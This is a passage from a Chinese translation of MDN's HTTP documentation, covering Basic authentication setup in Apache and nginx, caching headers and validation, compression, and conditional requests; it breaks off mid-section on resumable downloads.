- **Bearer** (查看 [RFC 6750](https://datatracker.ietf.org/doc/html/rfc6750), bearer 令牌通过OAuth 2.0保护资源),
- **Digest** (查看 [RFC 7616](https://datatracker.ietf.org/doc/html/rfc7616), 只有 md5 散列 在Firefox中支持, 查看 [bug 472823](https://bugzilla.mozilla.org/show_bug.cgi?id=472823) 用于SHA加密支持),
- **HOBA** (查看 [RFC 7486](https://datatracker.ietf.org/doc/html/rfc7486) (草案), **H**TTP **O**rigin-**B**ound 认证, 基于数字签名),
- **Mutual** (查看 [draft-ietf-httpauth-mutual](https://tools.ietf.org/html/draft-ietf-httpauth-mutual-11)),
- **AWS4-HMAC-SHA256** (查看 [AWS docs](https://docs.aws.amazon.com/AmazonS3/latest/API/sigv4-auth-using-authorization-header.html)).

## [基本验证方案](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Authentication#基本验证方案)

"Basic" HTTP 验证方案是在 [RFC 7617](https://datatracker.ietf.org/doc/html/rfc7617)中规定的，在该方案中，使用用户的 ID/密码作为凭证信息，并且使用 base64 算法进行编码。

### [基本验证方案的安全性](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Authentication#基本验证方案的安全性)

由于用户 ID 与密码是是以明文的形式在网络中进行传输的（尽管采用了 base64 编码，但是 base64 算法是可逆的），所以基本验证方案并不安全。基本验证方案应与 HTTPS / TLS 协议搭配使用。假如没有这些安全方面的增强，那么基本验证方案不应该被来用保护敏感或者极具价值的信息。

### [使用Apache限制访问和基本身份验证](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Authentication#使用apache限制访问和基本身份验证)

要对Apache服务器上的目录进行密码保护， 你需要一个 `.htaccess` 和 a `.htpasswd` 文件.

该 `.htaccess` 文件格式通常看起来像这样:

```
AuthType Basic
AuthName "Access to the staging site"
AuthUserFile /path/to/.htpasswd
Require valid-user
```

该 `.htaccess` 文件引用一个 `.htpasswd` 文件,其中每行用冒号（“：”）分隔的用户名和密码. 你不能看到真实的密码因为它们是 [encrypted](https://httpd.apache.org/docs/2.4/misc/password_encryptions.html) (在这个例子中是使用了 MD5). 你可以命名`.htpasswd` 文件 为你所喜欢的名字, 但是应该保证这个文件不被其他人访问. (Apache通常配置阻止访问 `.ht*` 类的文件).

```
aladdin:$apr1$ZjTqBB3f$IF9gdYAGlMrs2fuINjHsz.
user2:$apr1$O04r.y2H$/vEkesPhVInBByJUkXitA/
```

### [nginx访问限制和基本认证](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Authentication#nginx访问限制和基本认证)

在nginx配置中，对需要保护的location你需要做如下配置：`auth_basic指令提供密码保护域的名称；auth_basic_user_file指令指定包含用户密文的证书的文件（与apache例子中一致）`

在 nginx 中, 你需要指定一个保护区域和该 `auth_basic` 指令提供的保护区域名字. 然后该 `auth_basic_user_file` 指令指向一个`.htpasswd` 包含加密用户凭据的文件, 就像上面的 apache 例子.

```
location /status {
    auth_basic           "Access to the staging site";
    auth_basic_user_file /etc/apache2/.htpasswd;
}
```

---

# HTTP 缓存

通过复用以前获取的资源，可以显著提高网站和应用程序的性能。Web 缓存减少了等待时间和网络流量，因此减少了显示资源表示形式所需的时间。通过使用 HTTP缓存，变得更加响应性。

## [不同种类的缓存](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Caching#不同种类的缓存)

缓存是一种保存资源副本并在下次请求时直接使用该副本的技术。当 web 缓存发现请求的资源已经被存储，它会拦截请求，返回该资源的拷贝，而不会去源服务器重新下载。这样带来的好处有：缓解服务器端压力，提升性能(获取资源的耗时更短了)。对于网站来说，缓存是达到高性能的重要组成部分。缓存需要合理配置，因为并不是所有资源都是永久不变的：**重要的是对一个资源的缓存应截止到其下一次发生改变（即不能缓存过期的资源）。**

缓存的种类有很多,其大致可归为两类：私有与共享缓存。共享缓存存储的响应能够被多个用户使用。私有缓存只能用于单独用户。本文将主要介绍浏览器与代理缓存，除此之外还有网关缓存、CDN、反向代理缓存和负载均衡器等部署在服务器上的缓存方式，为站点和 web 应用提供更好的稳定性、性能和扩展性。

### [(私有)浏览器缓存](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Caching#私有浏览器缓存)

私有缓存只能用于单独用户。你可能已经见过浏览器设置中的“缓存”选项。浏览器缓存拥有用户通过 [HTTP](https://developer.mozilla.org/en-US/docs/Web/HTTP) 下载的所有文档。这些缓存为浏览过的文档提供向后/向前导航，保存网页，查看源码等功能，可以避免再次向服务器发起多余的请求。它同样可以提供缓存内容的离线浏览。

### [(共享)代理缓存](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Caching#共享代理缓存)

共享缓存可以被多个用户使用。例如，ISP 或你所在的公司可能会架设一个 web 代理来作为本地网络基础的一部分提供给用户。这样热门的资源就会被重复使用，减少网络拥堵与延迟。

---

## [缓存操作的目标](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Caching#缓存操作的目标)

虽然 HTTP 缓存不是必须的，但重用缓存的资源通常是必要的。**然而常见的 HTTP 缓存只能存储 [`GET`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/GET) 响应**，对于其他类型的响应则无能为力。缓存的关键主要包括request method和目标URI（一般只有GET请求才会被缓存）。 普遍的缓存案例:

- 一个检索请求的成功响应: 对于 [`GET`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/GET)请求，响应状态码为：[`200`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/200)，则表示为成功。一个包含例如HTML文档，图片，或者文件的响应。
- 永久重定向: 响应状态码：[`301`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/301)。
- 错误响应: 响应状态码：[`404`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/404) 的一个页面。
- 不完全的响应: 响应状态码 [`206`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/206)，只返回局部的信息。
- 除了 [`GET`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/GET) 请求外，如果匹配到作为一个已被定义的cache键名的响应。

针对一些特定的请求，也可以通过关键字区分多个存储的不同响应以组成缓存的内容。具体参考[下文](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Caching#varying responses)关于 [`Vary`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Vary) 的信息。

## [缓存控制](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Caching#缓存控制)

### [`Cache-control` 头](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Caching#cache-control_头)

**HTTP/1.1**定义的 [`Cache-Control`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Cache-Control) 头用来区分对缓存机制的支持情况， 请求头和响应头都支持这个属性。通过它提供的不同的值来定义缓存策略。

#### 没有缓存

缓存中不得存储任何关于客户端请求和服务端响应的内容。每次由客户端发起的请求都会下载完整的响应内容。

```html
Cache-Control: no-store
```

#### 缓存但重新验证

如下头部定义，此方式下，每次有请求发出时，缓存会将此请求发到服务器（译者注：该请求应该会带有与本地缓存相关的验证字段），**服务器端会验证请求中所描述的缓存是否过期**，若未过期（注：实际就是返回304），则缓存才使用本地缓存副本。

```html
Cache-Control: no-cache
```

#### 私有和公共缓存

"public" 指令表示该响应可以被任何中间人（译者注：比如中间代理、CDN等）缓存。若指定了"public"，则一些通常不被中间人缓存的页面（译者注：因为默认是private）（比如 带有HTTP验证信息（帐号密码）的页面 或 某些特定状态码的页面），将会被其缓存。

而 "private" 则表示该响应是专用于某单个用户的，中间人不能缓存此响应，该响应只能应用于浏览器私有缓存中。

```html
Cache-Control: private
Cache-Control: public
```

#### 过期

过期机制中，最重要的指令是 "`max-age=<seconds>`"，表示资源能够被缓存（保持新鲜）的最大时间。相对[Expires](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Expires)而言，max-age是距离请求发起的时间的秒数。针对应用中那些不会改变的文件，通常可以手动设置一定的时长以保证缓存有效，例如图片、css、js等静态资源。

详情看下文关于[缓存有效性](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Caching_FAQ#Freshness)的内容。

```html
Cache-Control: max-age=31536000
```

#### 验证方式

当使用了 "`must-revalidate`" 指令，那就意味着缓存在考虑使用一个陈旧的资源时，必须先验证它的状态，已过期的缓存将不被使用。详情看下文关于[缓存校验](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Caching_FAQ#Cache_validation)的内容。

```html
Cache-Control: must-revalidate
```

### [`Pragma` 头](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Caching#pragma_头)

[`Pragma`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Pragma) 是**HTTP/1.0**标准中定义的一个header属性，请求中包含Pragma的效果跟在头信息中定义Cache-Control: no-cache相同，但是HTTP的响应头没有明确定义这个属性，所以它不能拿来完全替代HTTP/1.1中定义的Cache-control头。通常定义Pragma以向后兼容基于HTTP/1.0的客户端。

---

## [新鲜度](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Caching#新鲜度)

理论上来讲，当一个资源被缓存存储后，该资源应该可以被永久存储在缓存中。由于缓存只有有限的空间用于存储资源副本，所以缓存会定期地将一些副本删除，这个过程叫做**缓存驱逐**。另一方面，当服务器上面的资源进行了更新，那么缓存中的对应资源也应该被更新，由于HTTP是C/S模式的协议，服务器更新一个资源时，不可能直接通知客户端更新缓存，所以双方必须为该资源约定一个过期时间，在该过期时间之前，该资源（缓存副本）就是新鲜的，当过了过期时间后，该资源（缓存副本）则变为陈旧的*。***驱逐算法用于将陈旧的资源（缓存副本）替换为新鲜的**，注意，一个陈旧的资源（缓存副本）是不会直接被清除或忽略的，当客户端发起一个请求时，缓存检索到已有一个对应的陈旧资源（缓存副本），则缓存会先将此请求附加一个`If-None-Match`头，然后发给目标服务器，以此来检查该资源副本是否是依然还是算新鲜的，若服务器返回了 [`304`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/304) (Not Modified)（该响应不会有带有实体信息），则表示此资源副本是新鲜的，这样一来，可以节省一些带宽。若服务器通过 If-None-Match 或 If-Modified-Since判断后发现已过期，那么会带有该资源的实体内容返回。

下面是上述缓存处理过程的一个图示：

![Show how a proxy cache acts when a doc is not cache, in the cache and fresh, in the cache and stale.](https://mdn.mozillademos.org/files/13771/HTTPStaleness.png)

对于含有特定头信息的请求，会去计算缓存寿命。比如`Cache-control: max-age=N`的头，相应的缓存的寿命就是`N`。通常情况下，对于不含这个属性的请求则会去查看是否包含[Expires](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Expires)属性，通过比较Expires的值和头里面[Date](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Date)属性的值来判断是否缓存还有效。如果max-age和expires属性都没有，找找头里的[Last-Modified](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Last-Modified)信息。如果有，缓存的寿命就等于头里面Date的值减去Last-Modified的值除以10（注：根据rfc2626其实也就是乘以10%）。

缓存失效时间计算公式如下：

```
expirationTime = responseTime + freshnessLifetime - currentAge
```

上式中，`responseTime` 表示浏览器接收到此响应的那个时间点。

---

### [改进资源](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Caching#改进资源)

我们使用缓存的资源越多，网站的响应能力和性能就会越好。**为了优化缓存，过期时间设置得尽量长是一种很好的策略**。对于定期或者频繁更新的资源，这么做是比较稳妥的，但是对于那些长期不更新的资源会有点问题。这些固定的资源在一定时间内受益于这种长期保持的缓存策略，但一旦要更新就会很困难。特指网页上引入的一些js/css文件，当它们变动时需要尽快更新线上资源。

web开发者发明了一种被 Steve Souders 称之为 `revving` 的技术[[1\]](https://www.stevesouders.com/blog/2008/08/23/revving-filenames-dont-use-querystring/) 。不频繁更新的文件会使用特定的命名方式：在URL后面（通常是文件名后面）会加上版本号。**加上版本号后的资源就被视作一个完全新的独立的资源，同时拥有一年甚至更长的缓存过期时长**。但是这么做也存在一个弊端，所有引用这个资源的地方都需要更新链接。web开发者们通常会采用自动化构建工具在实际工作中完成这些琐碎的工作。当低频更新的资源（js/css）变动了，只用在高频变动的资源文件（html）里做入口的改动。

这种方法还有一个好处：同时更新两个缓存资源不会造成部分缓存先更新而引起新旧文件内容不一致。对于互相有依赖关系的css和js文件，避免这种不一致性是非常重要的。

![img](https://mdn.mozillademos.org/files/13779/HTTPRevved.png)

加在加速文件后面的版本号不一定是一个正式的版本号字符串，如1.1.3这样或者其他固定自增的版本数。它可以是任何防止缓存碰撞的标记例如hash或者时间戳。

---

## [缓存验证](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Caching#缓存验证)

用户点击刷新按钮时会开始缓存验证。如果缓存的响应头信息里含有"Cache-control: must-revalidate”的定义，在浏览的过程中也会触发缓存验证。另外，在浏览器偏好设置里设置Advanced->Cache为强制验证缓存也能达到相同的效果。

当缓存的文档过期后，需要进行缓存验证或者重新获取资源。只有在服务器返回强校验器或者弱校验器时才会进行验证。

### [ETags](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Caching#etags)

作为缓存的一种强校验器，[`ETag`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/ETag) 响应头是一个对用户代理(User Agent, 下面简称UA)不透明（译者注：UA 无需理解，只需要按规定使用即可）的值。对于像浏览器这样的HTTP UA，不知道ETag代表什么，不能预测它的值是多少。如果资源请求的响应头里含有ETag, 客户端可以在后续的请求的头中带上 [`If-None-Match`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/If-None-Match) 头来验证缓存。

[`Last-Modified`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Last-Modified) 响应头可以作为一种弱校验器。说它弱是因为它只能精确到一秒。如果响应头里含有这个信息，客户端可以在后续的请求中带上 [`If-Modified-Since`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/If-Modified-Since) 来验证缓存。

当向服务端发起缓存校验的请求时，服务端会返回 [`200`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/200) ok表示返回正常的结果或者 [`304`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/304) Not Modified(不返回body)表示浏览器可以使用本地缓存文件。304的响应头也可以同时更新缓存文档的过期时间。

---

## [Vary 响应](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Caching#vary_响应)

[`Vary`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Vary) HTTP 响应头决定了对于后续的请求头，如何判断是请求一个新的资源还是使用缓存的文件。

当缓存服务器收到一个请求，只有当前的请求和原始（缓存）的请求头跟缓存的响应头里的Vary都匹配，才能使用缓存的响应。

使用vary头有利于内容服务的动态多样性。例如，使用Vary: User-Agent头，缓存服务器需要通过UA判断是否使用缓存的页面。如果需要区分移动端和桌面端的展示内容，利用这种方式就能避免在不同的终端展示错误的布局。另外，它可以帮助 Google 或者其他搜索引擎更好地发现页面的移动版本，并且告诉搜索引擎没有引入[Cloaking](https://en.wikipedia.org/wiki/Cloaking)。

```html
Vary: User-Agent
```

因为移动版和桌面的客户端的请求头中的User-Agent不同， 缓存服务器不会错误地把移动端的内容输出到桌面端到用户。

---

# HTTP 协议中的数据压缩

**数据压缩**是提高 Web 站点性能的一种重要手段。对于有些文件来说，高达70%的压缩比率可以大大减低对于带宽的需求。随着时间的推移，压缩算法的效率也越来越高，同时也有新的压缩算法被发明出来，应用在客户端与服务器端。

在实际应用时，web 开发者不需要亲手实现压缩机制，浏览器及服务器都已经将其实现了，不过他们需要确保在服务器端进行了合理的配置。数据压缩会在三个不同的层面发挥作用：

- 首先某些格式的文件会采用特定的优化算法进行压缩，
- 其次在 HTTP 协议层面会进行通用数据加密，即数据资源会以压缩的形式进行端到端传输，
- 最后数据压缩还会发生在网络连接层面，即发生在 HTTP 连接的两个节点之间。

## [文件格式压缩](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Compression#文件格式压缩)

每一种文件类型都会存有冗余，也就是浪费的空间。如果一个典型的文本文件存在60%的冗余的话，那么对于其他类型的文件例如音频或视频文件来说，这个比率会更高。不同于文本文件，这些其他类型的媒体文件占据的空间也更大，所以很早就出现了回收这些浪费的空间的需求。工程师们设计了可以应用于特定用途的文件类型的经过优化的算法。用于文件的压缩算法可以大致分为两类：

- 无损压缩算法。在压缩与解压缩的过程中，不会对要恢复的数据进行修改。复原后的数据与原始数据是一致的（比特与比特之间一一对应）。
  对于图片文件来说，gif 或者 png 格式的文件就是采用了无损压缩算法。.
- 有损压缩算法。在压缩与解压缩的过程中，会对原始数据进行修改，但是会以用户无法觉察的方式进行。
  网络上的视频文件通常采用有损压缩算法，图片是`jpeg`。

一些特定的文件格式既可以采用无损压缩算法，又可以采用有损压缩算法，例如 `webp` ，并且有损压缩算法可以对压缩比率进行配置，当然这会导致压缩品质的不同。为了使一个站点获得更好的性能，理想情况是在保持可以接受的品质水准的前提下，压缩比率尽可能得高。对于图片来说，通过压缩工具生成的图片对于 Web 应用来说，优化程度可能依然不够高。一般建议选用在保持所要求的品质的前提下压缩比率尽可能高的工具。这里有[各种各样的工具](http://www.creativebloq.com/design/image-compression-tools-1132865)专门用来干这个。

有损压缩通常会比无损压缩效率更高一些。

> 由于数据压缩技术在一些特定类型的文件上效果很好，再次进行压缩通常没有什么效果。事实上，这种做法常常会适得其反，因为间接开销（算法通常需要使用字典，而字典的大小是会计入初始大小的）会比在压缩过程中获取的额外收益要高，从而会使文件的体积增加。不要对文件类型为压缩格式的文件应用如下两种压缩技术。

---

## [端到端压缩技术](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Compression#端到端压缩技术)

对于各种压缩手段来说，端到端压缩技术是 Web 站点性能提升最大的部分之所在。端到端压缩技术指的是消息体压缩是在服务器端完成的，并且在传输过程中保持不变，直到抵达客户端。不管途中遇到什么样的中间节点，它们都会使消息体保持原样。

![img](https://mdn.mozillademos.org/files/13801/HTTPEnco1.png)

所有的现代浏览器及服务器都支持该技术，唯一需要协商的是所采用的压缩算法。这些压缩算法是为文本内容进行过优化的。在20世纪，压缩技术快速发展，为数众多的算法相继出现，扩大了可选的范围。如今只有两种算法有着举足轻重的地位：gzip 应用最广泛，br 则是新的挑战者。

为了选择要采用的压缩算法，浏览器和服务器之间会使用[主动协商机制](https://developer.mozilla.org/en-US/docs/Web/HTTP/Content_negotiation)。浏览器发送 [`Accept-Encoding`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Accept-Encoding) 首部，其中包含有它所支持的压缩算法，以及各自的优先级，服务器则从中选择一种，使用该算法对响应的消息主体进行压缩，并且发送 [`Content-Encoding`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Encoding) 首部来告知浏览器它选择了哪一种算法。由于该内容协商过程是基于编码类型来选择资源的展现形式的，在响应中， [`Vary`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Vary) 首部中至少要包含 [`Accept-Encoding`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Accept-Encoding) ；这样的话，缓存服务器就可以对资源的不同展现形式进行缓存。

![img](https://mdn.mozillademos.org/files/13811/HTTPCompression1.png)

由于压缩技术可以带来很大的性能提升，建议对除了已经经过压缩的文件如图片、音频和视频文件之外的其他类型的文件均进行应用。

Apache 服务器支持数据压缩，有 [mod_deflate](https://httpd.apache.org/docs/current/mod/mod_deflate.html)可供使用；nginx 中有[ngx_http_gzip_module](http://nginx.org/en/docs/http/ngx_http_gzip_module.html) 模块；在 IIS 中则可以使用 `<httpCompression>` 元素。

## [逐跳压缩技术](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Compression#逐跳压缩技术)

逐跳压缩技术尽管与端到端压缩技术有些类似，但是它们在一点上有着本质的区别，即这里的压缩指的不是对源头服务器上的资源的压缩，以此来创建一份特定的展现形式然后进行传输，而是对客户端与服务器端之间的任意两个节点之间传递的消息的主体的压缩。在两个相邻的中间节点之间的连接上，可能会应用不同的压缩方式。

![img](https://mdn.mozillademos.org/files/13807/HTTPTE1.png)

为了实现这个目的，HTTP 协议中采用了与端到端压缩技术所使用的内容协商机制相类似的机制：节点发送请求，使用 [`TE`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/TE) 首部来宣布它的意愿，另外一个节点则从中选择合适的方法，进行应用，然后在 [`Transfer-Encoding`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Transfer-Encoding) 首部中指出它所选择的方法。

![img](https://mdn.mozillademos.org/files/13809/HTTPComp2.png)

在实际应用中，逐跳压缩对于服务器和客户端来说是不可见的，并且很少使用。[`TE`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/TE) 首部和 [`Transfer-Encoding`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Transfer-Encoding) 首部最常用来发送分块响应，允许在获得资源的确切长度之前就可以开始传输。

注意，在单次转发层面使用 [`Transfer-Encoding`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Transfer-Encoding) 首部和压缩技术是如此地少见，以至于 Apache、nginx 或 IIS 等服务器都不太容易配置。此类配置通常用在代理服务器层面。

---

# HTTP 条件请求

在 HTTP 协议中有一个“**条件式请求**”的概念，在这类请求中，请求的结果，甚至请求成功的状态，都会随着验证器与受影响资源的比较结果的变化而变化。这类请求可以用来验证缓存的有效性，省去不必要的控制手段，以及验证文件的完整性，例如在断点续传的场景下或者在上传或者修改服务器端的文件的时候避免更新丢失问题。

## [基本原理](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Conditional_requests#基本原理)

在 HTTP 协议中，条件请求指的是请求的执行结果会因特定首部的值不同而不同。这些首部规定了请求的前置条件，请求结果则视条件匹配与否而有所不同。

请求引发的不同的反应取决于请求所使用的方法，以及组成前置条件首部集合：

- 对于安全（[safe](https://developer.mozilla.org/zh-CN/docs/Glossary/safe)）方法来说，例如 [`GET`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/GET)，通常用来获取文件，条件请求可以被用来限定仅在满足条件的情况下返回文件。这样可以节省带宽。
- 对于非安全（[unsafe](https://developer.mozilla.org/zh-CN/docs/Glossary/safe)）方法来说，例如 [`PUT`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/PUT) 方法，通常用来上传文件，条件请求可以被用来限定仅在满足文件的初始版本与服务器上的版本相同的条件下才会将其上传。

## [验证器](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Conditional_requests#验证器)

所有的条件请求首部都是试图去检测服务器上存储的资源是否与某一特定版本相匹配。为了达到这个目的，条件请求需要指明资源的版本。由于逐个字节去比较完整资源是不切实际的，况且这也并非总是想要的结果，所以在请求中会传递一个描述资源版本的值。这些值称为“验证器”，并且分为两大类：

- 文件的最后修改时间，即 *last-modified* （最后修改）时间。
- 一个意义模糊的字符串，指代一个独一无二的版本，称为“**实体标签**”，或者 *etag 。*

比较同一份资源的不同版本有一定的技巧性：取决于上下文环境的不同，有两种不同的等值检查（*equality checks*）类型：

- 强验证类型（*Strong validation*）应用于需要逐个字节相对应的情况，例如需要进行断点续传的时候。
- 弱验证类型（*Weak validation*）应用于用户代理只需要确认资源内容相同即可。即便是有细微差别也可以接受，比如显示的广告不同，或者是页脚的时间不同。

验证类型与验证器的类型是相互独立的。 [`Last-Modified`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Last-Modified) 和 [`ETag`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/ETag) 首部均可应用于两种验证类型，尽管在服务器端实现的复杂程度可能会有所不同。HTTP 协议默认使用强验证类型，可以指定何时使用弱验证类型。

### [强验证类型](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Conditional_requests#强验证类型)

强验证类型的作用在于确保要比较的资源与其相比较的对象之间每一个字节都相同。对于有些首部来说需要明确指定该验证类型，而对于另外一些来说则是默认值就是强验证类型。强验证类型的要求相当严格，在服务器层面来说可能较难保证。但是它确保了数据在任何时候都没有缺损，有时候则需要以牺牲性能为代价。

使用 [`Last-Modified`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Last-Modified) 首部很难为强验证类型提供一个唯一标识。通常这是由 [`ETag`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/ETag) 首部来完成的，该首部可以提供使用 MD5 算法获取的资源（或其衍生品）的散列值。

### [弱验证类型](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Conditional_requests#弱验证类型)

弱验证类型与强验证类型不同，因为它会把内容相同的两份文件看做是一样的。例如，使用弱验证类型，一个页面与另外一个页面只是在页脚显示的时间上有所不同，或者是展示的广告不相同，那么就会被认为是**相同的**。但是在使用强验证的情况下，二者是**不同的**。构建应用于弱验证类型的标签（etag）体系可能会比较复杂，因为这会涉及到对页面上不同的元素的重要性进行排序，但是会对缓存性能优化相当有帮助。

---

## [条件首部](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Conditional_requests#条件首部)

一些被称为条件首部的 HTTP 首部，可以引发条件请求。它们是：

- [`If-Match`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/If-Match)

  如果远端资源的实体标签与在 [`ETag`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/ETag) 这个首部中列出的值相同的话，表示条件匹配成功。默认地，除非实体标签带有 'W/' 前缀，否者它将会执行强验证。

- [`If-None-Match`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/If-None-Match)

  如果远端资源的实体标签与在 [`ETag`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/ETag) 这个首部中列出的值都不相同的话，表示条件匹配成功。默认地，除非实体标签带有 'W/' 前缀，否者它将会执行强验证。

- [`If-Modified-Since`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/If-Modified-Since)

  如果远端资源的 [`Last-Modified`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Last-Modified) 首部标识的日期比在该首部中列出的值要更晚，表示条件匹配成功。

- [`If-Unmodified-Since`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/If-Unmodified-Since)

  如果远端资源的 HTTPHeader("Last-Modified")}} 首部标识的日期比在该首部中列出的值要更早或相同，表示条件匹配成功。

- [`If-Range`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/If-Range)

  与 [`If-Match`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/If-Match) 或  [`If-Unmodified-Since`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/If-Unmodified-Since) 相似，但是只能含有一个实体标签或者日期值。如果匹配失败，则条件请求宣告失败，此时将不会返回 [`206`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/206) `Partial Content` 响应码，而是返回 [`200`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/200) `OK` 响应码，以及完整的资源。

---

## [应用场景](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Conditional_requests#应用场景)

### [缓存更新](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Conditional_requests#缓存更新)

条件式请求最常见的应用场景是更新缓存。假如缓存为空，或者是没有缓存的话，被请求资源会以状态码 [`200`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/200) `OK `返回。

![The request issued when the cache is empty triggers the resource to be downloaded, with both validator value sent as headers. The cache is then filled.](https://mdn.mozillademos.org/files/13729/Cache1.png)

验证器会同资源一起返回，它们出现在首部字段中。在这个例子中， [`Last-Modified`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Last-Modified) 与 [`ETag`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/ETag) 都被返回，不过如果只返回其中的一个也是可以的。这些验证器会同资源一起被缓存起来（与所有的首部一样），并在在缓存失效的时候用来发起条件式请求。

只要缓存未失效，就不会发起任何请求。但是一旦失效——主要是由 [`Cache-Control`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Cache-Control) 首部控制——客户端就不会采用缓存值而是发起条件式请求。验证器的值会用作 [`If-Modified-Since`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/If-Modified-Since) 和 [`If-Match`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/If-Match) 首部字段的参数。

假如资源未发生变化，服务器就返回状态码为 [`304`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/304) `Not Modified` 的响应。这样相当于对缓存资源进行了刷新，而客户端则采用被缓存的资源。尽管这里有一次请求/响应往返会消耗一定的资源，但是这样做比将整个资源通过网络再传输一遍更高效。

![With a stale cache, the conditional request is sent. The server can determine if the resource changed, and, as in this case, decide not to send it again as it is the same.](https://mdn.mozillademos.org/files/13731/HTTPCache2.png)

假如资源发生了变化，服务器就直接返回 [`200`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/200)` OK` 响应码，连同新版本的资源，就像是没有应用条件式请求一样；客户端则采用新版本资源（并将其缓存起来）。

![In the case where the resource was changed, it is sent back as if the request wasn't conditional.](https://mdn.mozillademos.org/files/13733/HTTPCache3.png)

 除了需要在服务器端对验证器进行设置以外，该机制是透明的：所有的浏览器都会对缓存资源进行管理，在不需要 Web 开发者进行任何特殊处理的情况下发送条件式请求。

### [增量下载的完整性](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Conditional_requests#增量下载的完整性)

文件的增量下载是 HTTP 协议规定的一项功能，它允许恢复先前的操作，通过保存先前已经获得的信息来节省带宽和时间：

支持增量下载的服务器会通过 [`Accept-Ranges`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Accept-Ranges) 首部来广播这项能力。此后客户端就可以通过发送 [Ranges (en-US)](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Range) 首部字段以及缺失的范围值来进行断点续传了：

